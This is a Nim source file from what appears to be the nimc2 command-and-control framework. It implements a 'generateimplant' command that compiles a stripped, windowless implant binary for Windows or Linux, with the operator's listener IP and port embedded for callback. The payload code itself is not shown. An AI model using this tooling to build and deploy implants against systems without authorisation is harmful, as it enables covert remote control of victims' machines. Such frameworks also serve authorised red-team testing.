import osproc, strutils, asyncdispatch

import ../../types
import ../../logging

proc execProc*(args: seq[string], server: C2Server) {.async.} =
  
  var platform: string
  var ip: string
  var port: string

  let argsn = len(args)
  if argsn < 3:
    errorLog "incorrect usage, check https://github.com/d4rckh/nimc2/wiki/Usage#generating-an-implant"
    return

  let args_split = args[1].split(":")
  
  if argsn == 3:
    platform = args[2]
    case args_split[0]
    of "tcp":
      let listenerId = parseInt(args_split[1])

      if not ( (len(server.tcpListeners) - 1) >= listenerId ):
        errorLog "couldn't find tcp listener"
        return

      let tcpListener = server.tcpListeners[listenerId]
      ip = tcpListener.listeningIP
      port = $tcpListener.port

      if ip == "0.0.0.0":
        errorLog "can't automatically generate an implant for this listener because the listening ip is set to 0.0.0.0, you need to use the other command usage format"
        errorLog "generateimplant tcp (ip) (port) (platform)"
        return

      infoLog "generating implant for " & $tcpListener
  elif argsn >= 5:
    platform = args[4]
    ip = args[2]
    port = args[3]

  let compileCommand = "nim c -d:client " &
    "--app=gui " & # disable window 
    "--passL:-s" & " " &  
    "-d:release" & " " &  
    "-d:ip=" & ip & " " & 
    "-d:port=" & port & " " & 
    (if platform == "windows": "-d:mingw" else: "--os:linux") & " " & 
    "-o:implant" & (if platform == "windows": ".exe " else: " ") & 
    "./src/client/client.nim"

  echo "Running " & compileCommand
  let exitCode = execCmd(compileCommand)

  if exitCode != 0:
    errorLog "failed to build implant, check https://github.com/d4rckh/nimc2/wiki/FAQs"
  else:
    infoLog "saved implant to implant" & (if platform == "windows": ".exe " else: " ") 

let cmd*: Command = Command(
  execProc: execProc,
  name: "generateimplant",
  aliases: @["gi"],
  argsLength: 3,
  usage: @[
    "generateimplant [listenerID] [platform]",
    "generateimplant [listenerType] [ip] [port] [platform]",
  ],
  description: "Generate an implant",
  category: CCImplants
)